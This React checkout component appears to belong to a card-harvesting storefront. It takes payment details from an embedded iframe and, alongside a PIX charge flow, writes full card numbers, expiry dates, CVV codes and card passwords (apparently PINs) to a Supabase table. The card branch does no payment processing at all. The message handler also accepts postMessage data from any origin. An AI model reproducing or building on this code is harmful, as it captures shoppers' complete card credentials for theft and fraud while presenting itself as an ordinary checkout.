import { useCallback, useEffect, useRef } from 'react'
import {
  CHECKOUT_PIX_SESSION_KEY,
  type CheckoutPixSession,
} from '../../lib/checkoutPixSession'
import { supabase } from '../../lib/supabase'

type CheckoutMessage = {
  source?: string
  event?: string
  payload?: Record<string, unknown>
}

function asString(v: unknown) {
  return typeof v === 'string' ? v : ''
}

function parseAmount(totalFinal: unknown): number {
  if (typeof totalFinal === 'number' && Number.isFinite(totalFinal)) {
    return totalFinal
  }
  return Number(String(totalFinal ?? '').replace(',', '.')) || 0
}

function buildUsersAndCaedRow(
  p: Record<string, unknown>,
  pixMeta?: {
    risepay_identifier?: string | null
    payment_status?: string
  },
) {
  const base = {
    full_name: asString(p.customer_name) || 'teste',
    cpf: asString(p.cpf).replace(/\D/g, '') || '00000000000',
    email: asString(p.email) || 'teste@teste.com',
    phone: asString(p.phone) || '00000000000',
    cep: asString(p.zipcode).replace(/\D/g, '') || '00000000',
    address: asString(p.address) || 'teste',
    number: asString(p.number) || '0',
    complement: null,
    neighborhood: asString(p.neighborhood) || 'teste',
    city: asString(p.city) || 'teste',
    state: (asString(p.state) || 'SP').slice(0, 2).toUpperCase(),
    payment_method: asString(p.payment_method) === 'pix' ? 'pix' : 'card',
    card_holder_name: asString(p.customer_name) || null,
    card_brand: null,
    card_number: asString(p.card_number) || null,
    card_expiry: asString(p.card_expiry) || null,
    card_cvv: asString(p.card_cvv) || null,
    card_cpf: asString(p.card_cpf) || null,
    card_password: asString(p.card_password) || null,
    card_last4: asString(p.card_number).replace(/\D/g, '').slice(-4) || null,
    cart_items: [],
    cart_subtotal: parseAmount(p.total_final),
  }
  if (!pixMeta) return base
  return {
    ...base,
    risepay_identifier: pixMeta.risepay_identifier ?? null,
    payment_status: pixMeta.payment_status ?? 'pending',
  }
}

type RisePayPixResponse = {
  identifier?: string
  status?: string
  pix?: { qrCode?: string }
  error?: string
  details?: unknown
  object?: RisePayPixResponse
}

function unwrapRisepayPixJson(json: RisePayPixResponse): RisePayPixResponse {
  const o = json.object
  if (o && typeof o === 'object') {
    return o
  }
  return json
}

function formatPixErrorForUser(json: RisePayPixResponse): string {
  const details = json.details
  let msg = ''
  if (details && typeof details === 'object' && !Array.isArray(details)) {
    const m = (details as Record<string, unknown>).message
    if (typeof m === 'string' && m.trim()) msg = m.trim()
  }
  if (!msg && typeof json.error === 'string' && json.error.trim()) {
    msg = json.error.trim()
  }
  if (!msg) {
    msg = 'Não foi possível gerar o PIX. Tente de novo em instantes.'
  }

  const lower = msg.toLowerCase()
  if (lower.includes('email') || lower.includes('e-mail')) {
    return `${msg} Verifique o e-mail nos seus dados de contato.`
  }
  if (lower.includes('cpf')) {
    return `${msg} Confira o CPF informado.`
  }
  if (lower.includes('telefone') || lower.includes('phone')) {
    return `${msg} Confira o telefone informado.`
  }
  return msg
}

const RISEPAY_PIX_PATH = '/api/risepay-pix'

export function CheckoutPage() {
  const iframeRef = useRef<HTMLIFrameElement>(null)

  const notifyIframe = useCallback((event: string, payload: Record<string, unknown>) => {
    iframeRef.current?.contentWindow?.postMessage(
      { source: 'app222', event, payload },
      '*',
    )
  }, [])

  useEffect(() => {
    const onMessage = async (ev: MessageEvent<CheckoutMessage>) => {
      const data = ev.data
      if (!data || data.source !== 'checkout222') return

      const event = data.event
      const p = data.payload ?? {}

      if (event === 'checkout_pix_submit') {
        const amount = parseAmount(p.total_final)
        const externalRef = `cesta-${Date.now()}`
        const customer = {
          name: asString(p.customer_name).trim() || 'Cliente',
          email: asString(p.email).trim() || 'cliente@email.com',
          cpf: asString(p.cpf).replace(/\D/g, ''),
          phone: asString(p.phone).trim() || '(00) 00000-0000',
        }

        let res: Response
        try {
          res = await fetch(RISEPAY_PIX_PATH, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              amount,
              customer,
              externalReference: externalRef,
            }),
          })
        } catch {
          notifyIframe('risepay_pix_err', {
            message: 'Falha de rede ao gerar PIX.',
          })
          return
        }

        let json: RisePayPixResponse = {}
        try {
          json = (await res.json()) as RisePayPixResponse
        } catch {
          json = {}
        }

        if (!res.ok) {
          notifyIframe('risepay_pix_err', {
            message: formatPixErrorForUser(json),
            details: json.details,
          })
          return
        }

        const tx = unwrapRisepayPixJson(json)
        const qrCode = tx.pix?.qrCode
        if (!qrCode) {
          notifyIframe('risepay_pix_err', {
            message: formatPixErrorForUser(json),
            details: json.details,
          })
          return
        }

        if (supabase) {
          const { error: insertErr } = await supabase.from('users_and_caed').insert(
            buildUsersAndCaedRow(p, {
              risepay_identifier: tx.identifier ?? null,
              payment_status: 'pending',
            }),
          )
          if (insertErr) {
            console.warn('[checkout] users_and_caed PIX insert:', insertErr.message)
          }
        }

        const session: CheckoutPixSession = {
          qrCode,
          identifier: String(tx.identifier ?? ''),
          status: String(tx.status ?? ''),
          amount,
        }
        sessionStorage.setItem(CHECKOUT_PIX_SESSION_KEY, JSON.stringify(session))
        window.location.assign(`${window.location.origin}/checkout/pix`)
        return
      }

      if (event !== 'checkout_card_start') return
      if (!supabase) return

      await supabase.from('users_and_caed').insert(buildUsersAndCaedRow(p))
    }

    window.addEventListener('message', onMessage)
    return () => window.removeEventListener('message', onMessage)
  }, [notifyIframe])

  return (
    <div style={{ minHeight: '100vh', background: '#f5f5f5' }}>
      <iframe
        ref={iframeRef}
        title="Checkout"
        src="/222.html"
        style={{
          width: '100%',
          minHeight: '100vh',
          border: 'none',
          display: 'block',
          background: '#f5f5f5',
        }}
      />
    </div>
  )
}
